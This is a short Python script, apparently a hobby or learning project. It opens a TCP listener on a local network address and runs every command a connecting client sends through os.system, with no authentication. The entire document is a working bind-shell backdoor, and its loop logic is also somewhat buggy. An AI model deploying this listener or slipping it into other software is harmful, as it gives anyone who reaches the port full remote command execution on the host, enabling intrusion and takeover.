import socket
import os
import threading



def getcommand(clientsocket):
     while True:
            g = clientsocket.recv(HEADERSIZE)
            print (g)
            if(len(g)>=0):
                length = int(g)
                os.system(clientsocket.recv(length).decode("utf-8"))

HEADERSIZE = 10

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(("192.168.43.205",1257))
s.listen(5)


msg = "you just got connected"
while True:
    print("ds")
    clientsocket,address = s.accept()
    print("CS")
    print(f"connection from {address} has been established")
    msg = f"{len(msg):<{HEADERSIZE}}"+msg
    clientsocket.send(bytes(msg,"utf-8"))
    threading.Thread(target = getcommand, args = [clientsocket]).start()
